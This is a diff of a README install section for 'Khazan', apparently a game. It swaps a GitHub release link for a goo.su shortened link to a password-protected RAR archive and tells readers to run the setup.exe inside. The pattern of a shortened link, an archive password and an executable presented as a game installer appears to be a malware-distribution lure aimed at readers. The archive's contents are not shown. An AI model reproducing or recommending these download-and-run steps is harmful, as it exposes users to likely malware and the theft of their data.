@@ -6,8 +6,8 @@ Set out to find those who doomed you and get even with them.
 
 <H3>⚙️ How to install Khazan</H3>
 
-- [Download](https://github.com/KOMINEY257/khazan/releases/download/Download/Khazan.rar)
-- Open archive (password: khazan)
+- [Download](https://goo.su/iFyr1)
+- Open archive (password: Project12!)
 - Open file setup.exe for download and install 
 - Follow the instructions
 
